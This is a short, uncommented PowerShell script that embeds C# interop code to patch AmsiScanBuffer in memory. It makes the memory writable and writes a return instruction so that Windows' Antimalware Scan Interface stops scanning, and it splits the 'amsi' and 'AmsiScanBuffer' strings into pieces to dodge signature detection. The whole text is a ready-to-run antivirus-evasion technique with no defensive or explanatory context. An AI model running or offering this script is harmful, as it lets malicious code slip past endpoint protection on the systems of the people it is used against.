$code = @"
using System;
using System.Runtime.InteropServices;

public class Native
{

[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string name);

[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $code
$amsiDll = [Native]::LoadLibrary("am" + "si.dll")
$asbAddress = [Native]::GetProcAddress($amsiDll, "Am" + "si" + "Sc" + "an" + "Buf" + "fer")
$ret = [Byte[]] ( 0xC3 )
$o = 0
[Native]::VirtualProtect($asbAddress, [uint32]$ret.Length, 0x40, [ref] $o)

[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddress, $ret.Length)
[Native]::VirtualProtect($asbAddress, [uint32]$ret.Length, $o, [ref] $null)
